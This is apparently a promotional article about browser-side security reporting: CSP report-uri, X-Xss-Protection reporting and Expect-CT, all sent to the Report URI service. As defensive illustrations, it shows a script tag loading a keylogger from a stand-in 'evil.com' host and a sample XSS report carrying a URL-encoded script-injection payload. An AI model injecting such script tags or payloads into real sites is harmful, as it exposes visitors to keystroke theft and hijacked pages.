## Leveraging the browser to improve the security of the web 

Use of the Web is exploding. It has been exploding for some time and
will continue to do so for probably years to come. In our ever more
connected world, we become increasingly dependent on connected
technologies in every aspect of our day to day lives. Shopping, banking,
socialising and even watching movies requires online connectivity where
we open our browsers and use websites to do the things we want to do. As
websites handle increasing amounts of personal and sensitive information
they need to step up their security in a big way, but I can tell you
from experience this is no easy task. Fortunately, as the web has
evolved, this problem has been recognised and the wider industry is
taking steps to help us make security easier. What if I told you there
was a way to have possibly thousands, hundreds of thousands or even
millions of people ready to notify you if something goes wrong on your
website? What if the browser of every visitor to your website knew that
there was a problem and would tell you as soon as they spotted it? This
isn't some far-fetched wish of a future world, this is reality, right
now! Using a combination of modern features built into browsers you can
have each and every one of the browsers that visit your site perform a
series of checks and notify you about a huge range of possible problems,
automatically and in real-time. Welcome to the future, let me introduce
you to Report URI.

 

All modern browsers now come with a selection of features that can help
you quickly and drastically improve the security of your website. This
is a benefit to both the site operator and their visitors. By working
together this duo can help each other to take big steps forward. The
first feature that sites can leverage is Content Security Policy (CSP).
Originally created many years ago to help fight off Cross-Site Scripting
(XSS) attacks, CSP has grown to include a range of benefits that should
be attractive to any site operator. When a browser loads a webpage,
there are many other resources that it has to download to build the
page. Those resources could be images, scripts, stylesheets, iframes and
much, much more. If the browser sees an HTML element that instructs it
to download a resource, it will dutifully do so. The problem arises when
that element isn't supposed to be there, what if was put there by
mistake, or even worse, it was put there maliciously by a hacker? Take
the following script tag:

 

\<script src=<https://evil.com/keylogger.js>\>\</script\>

 

Raise your hand if you'd like your browser to block this file. Everyone?
Thought so! This script tag is probably not going to do nice things and
whilst you or I can look at it and make that assessment, the browser
can't. This is a valid script tag and the browser will download and run
the script, probably leading to some serious problems. What we need to
do is tell the browser which scripts are supposed to be on our site and
which ones aren't, this is where CSP comes in handy. With a CSP you can
tell the browser exactly what's supposed to be on your site and what
isn't. The CSP itself is delivered as an HTTP response header, so it's
really easy to get started. Set the header on your website and inside
the header, you declare the policy you'd like the browser to enforce. 

 

Content-Security-Policy: default-src 'self'

 

This CSP header sets that default (default-src) the browser can load
content from our own website ('self') and that's it. Straight away the
hostile script we saw above is blocked because we're not explicitly
allowed to load things from evil.com. We do probably want to load
scripts from our CDN though, so let's go ahead and allow that. 

 

Content-Security-Policy: default-src 'self'; script-src 'self'
my-cdn.com

 

We've now expanded our policy to take control of where scripts can load
from and restricted that to just our own website and my-cdn.com which is
the address of our CDN. This means we can now load the scripts we need,
while we continue to block malicious scripts like the keylogger above!
With CSP you can control all types of content that are loaded into your
site by listing each content type and then the locations you want to
allow content to be loaded from. There's a list of all the options you
can set in my CSP Cheat Sheet \[1\] if you want to look through them.

With the CSP set on your site, the browser will now block anything on
your page that shouldn't be there, which is great because sites can now
offer a higher level of protection to users against malicious content
and things like XSS attacks. Whilst that's great, the one thing we're
missing here is the knowledge that the browser is protecting visitors.
Site operators should know if the browser is having to take action to
protect users and fortunately we have a way for them to notify us, the
report-uri directive. 

 

Content-Security-Policy: default-src 'self'; script-src 'self'
my-cdn.com; report-uri [https://report-uri.com](https://report-uri.com/)

 

This extra 'directive' as we call them has been added to the CSP and it
tells the browser to send a report of something is requested that
shouldn't be requested. You provide the address where you'd like the
browser to send the report and as soon as something unexpected happens
the browser will send the report immediately. There's no user input or
action required, the report is sent in the background without disturbing
the user, and the browser has already taken action to protect the user,
it's now simply telling us, so we can identify and resolve the issue.
The report is sent to the address you specified:

{

\"csp-report\": {

\"blocked-uri\": \"https://evil.com/keylogger.js\",

\"document-uri\": \"https://scotthelme.co.uk/",

\"original-policy\": \"default-src 'self'; script-src 'self'
my-cdn.com\",

\"violated-directive\": \"script-src\"

}

}

 

The information that you need is all here and it's perfectly formatted.
We can see which page on our site the problem occurred on, which
offending item was blocked, which part of our policy was violated and a
copy of the original policy for debugging purposes. As soon as the site
operator receives this report they will know they have a problem on
their site and can start taking action to resolve it. Collecting these
reports does come with a few considerations, you need a publicly facing
endpoint that collects JSON for a start, so I built a service from the
ground up to do exactly this, Report URI.

![](./media/image1.png)


Report URI is designed to take all the pain out of collecting,
aggregating and analysing these reports by doing all of the hard parts
for you. You can set up an account and get started for free and enable
reporting with as little as a single line of code or config. By enabling
a CSP on your site you're asking the browser of every one of your
visitors to help you make sure that visitor remains safe. It will detect
problems, fixing them in some cases, and let the site operator know that
a problem occurred.

![](./media/image2.png)


With these reports, you can monitor exactly what's happening on your
site and as soon as something changes, something that wasn't expected or
shouldn't be happening, the reports will let you know. Here's an example
from my site where I recently deployed a change that had an unintended
impact.

![](./media/image3.png)


The benefits of reporting are huge, you just can't get information like
this in any other way. If you have millions of visitors, then you're
protecting them all and they're helping you protect them by telling you
when things go wrong. Things don't stop there though, CSP isn't the only
security feature in the browser that you can leverage as a site
operator, there's more. In fact, there are another four features that
you can leverage to provide better security for your visitors and have
them report back when things go wrong.

All Chromium-based browsers (Chrome, Opera, et al.), Webkit based
browsers (Safari, et al.) and IE/Edge have a built-in feature designed
to detect attacks against their users. The XSS Auditor is bundled free
with these browsers and is a native defence provided by the browser
vendor. The Auditor can take action to protect users if it thinks
they're being attacked, but how would you know? Wouldn't you want to
know if the browser had to step in and take action because it thought
your visitor was being attacked? I sure would! Using the
X-Xss-Protection (XXP) header you can take control of the XSS Auditor in
the browser and configure it to be more strict, more relaxed, or even
disable it if you're feeling brave. One of the main things that you
should do though, no matter how you decide to configure it, is to enable
reporting. Tell the browser that if it feels the need to take action
then it has to tell you about, you need to know. Here's one example of
how you can deliver the header to configure the Auditor.

X-Xss-Protection: 1; mode=block; report=<https://report-uri.com>

With this deployed on your site, the Auditor will not only block attacks
against your user but it will report them to you with all the details of
what happened, including the attack payload.

{

\"xss-report\": {

\"request-url\":
\"https://scotthelme.co.uk/x-xss-protection-1-mode-block-demo/?foo=%3Cscript%20src=%22https://securityheaders.io/alert.js%22%3E%3C/script%3E\",

\"request-body\": \"\"

}

}

I have a page set up to allow people to simulate an attack to
demonstrate the capabilities of both the XSS Auditor and reporting but
imagine if this *was* a real attack. The browser has detected it,
neutralised it and reported back to me to let me know the attack
happened and exactly what the attack payload was. This is powerful,
really powerful, and this kind of monitoring is so useful I'd go so far
as to say it was essential.

Another great advance in the security of the web is coming this month
with the requirements around something called Certificate Transparency
(CT). If you want to setup HTTPS on your website you need to get a
certificate from a Certificate Authority (CA). The idea is that only
you, the domain owner, can get a certificate for your domain but every
so often someone manages to get a certificate for a domain they don't
own. We call this is a mis-issuance and it's a pretty serious event
because it would allow someone else to decrypt traffic to your secure
site and to successfully impersonate your site. CT requires that all
certificates must now be publicly logged. The logs themselves are
actually Merkle Hash Trees, which is a blockchain to most people, so
they are append-only and immutable. For your website to continue to work
in Chrome, and soon other browsers, your certificates must be logged
publicly or Chrome will reject them. Most site operators shouldn't need
to worry about this because your CA should do it for you, but, that
doesn't mean we can't make sure. After all, if your website isn't
working and people can't visit it, you'd like to know, right?

Expect-CT: max-age=0,
report-uri=\"https://scotthelme.report-uri.com/r/d/ct/reportOnly\"

The Expect-CT (ECT) headers instructs the browser that you are expecting
your certificate to be CT Qualified (the technical term for meeting the
criteria) and that it should have no problems with your certificate,
meaning it can visit your site. If there is a problem with your
certificate, and, for some reason, the browser can't visit your site,
you need to know that because otherwise, you could be losing visitors
and without knowing about it. Once the ECT header is deployed the
browser will send you a report if there's a problem and it refuses to
load the site. It will tell you what went wrong, why it went wrong and
provide a copy of the certificate itself so you can easily debug the
issue. That means you get on with fixing the problem right away.

{

\"expect-ct-report\": {

\"date-time\": \"2018-04-04T05:17:46.526Z\",

\"effective-expiration-date\": \"2018-04-04T05:17:46.526Z \",

\"hostname\": \"scotthelme.co.uk\",

\"port\": 443,

\"scts\": \[sct1, \... sctN\],

\"served-certificate-chain\": \[pem1, \... pemN\],

\"validated-certificate-chain\": \[pem1, \... pemN\]

}

}

If you're interested in further things that the browser can do to help
you then search for Expect-Staple and HTTP Public Key Pinning.

As the web is evolving, the browsers that we use are evolving too. These
new features keep your uses more secure and they enable you to act on
problems immediately.

These features can help you better protect your user and tap into a
source of information that isn't available anywhere else. Real-time
reporting of security problems and other issues on your site is within
reach, and it doesn't need to be complicated or expensive. Each and
everyone one of your visitors has the power to help you, it's time we
harnessed that power. The only thing you need to do is to update your
web applications to take advantage of the reports the browser wants to
send.

 

 

\[1\] https://scotthelme.co.uk/csp-cheat-sheet/
